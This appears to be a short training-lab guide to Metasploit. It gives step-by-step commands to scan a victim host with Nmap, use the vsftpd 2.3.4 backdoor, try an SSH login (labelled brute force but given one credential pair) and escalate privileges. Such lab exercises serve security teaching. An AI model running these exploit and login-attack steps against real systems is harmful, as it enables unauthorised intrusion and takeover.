Metasploit Exploitation Guide

This guide explains how to exploit vulnerabilities using Metasploit.

Step 1: Login to Both Systems (Perform on Attacker and Victim Systems)

  • Attacker System: Username: user, Password: VSecureSphere
  • Victim System: Username: user, Password: VSecureSphere

Step 2: Acquiring Victim's IP (Perform on Victim System)

Run the following command on the victim system:

ifconfig

Note the IP address assigned to the victim.

Step 3: Scanning Victim (Perform on Attacker System)

Run Nmap from the attacker system:

nmap -p 22,21,80,445 <VICTIM-IP>

Step 4: Exploiting FTP Vulnerability (Perform on Attacker System)

Use the following Metasploit commands to exploit the vsftpd vulnerability:


use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS <VICTIM-IP>
set RPORT 21
exploit

Step 5: Exploiting SSH (Brute Force) (Perform on Attacker System)

Use a brute force attack on SSH:


use auxiliary/scanner/ssh/ssh_login
set RHOSTS <VICTIM-IP>
set USERNAME hacker
set PASSWORD password
run

Step 6: Privilege Escalation (Perform on Attacker System)

Once a session is obtained, escalate privileges:


use exploit/linux/local/sudo_bypass
set SESSION <SESSION-ID>
exploit
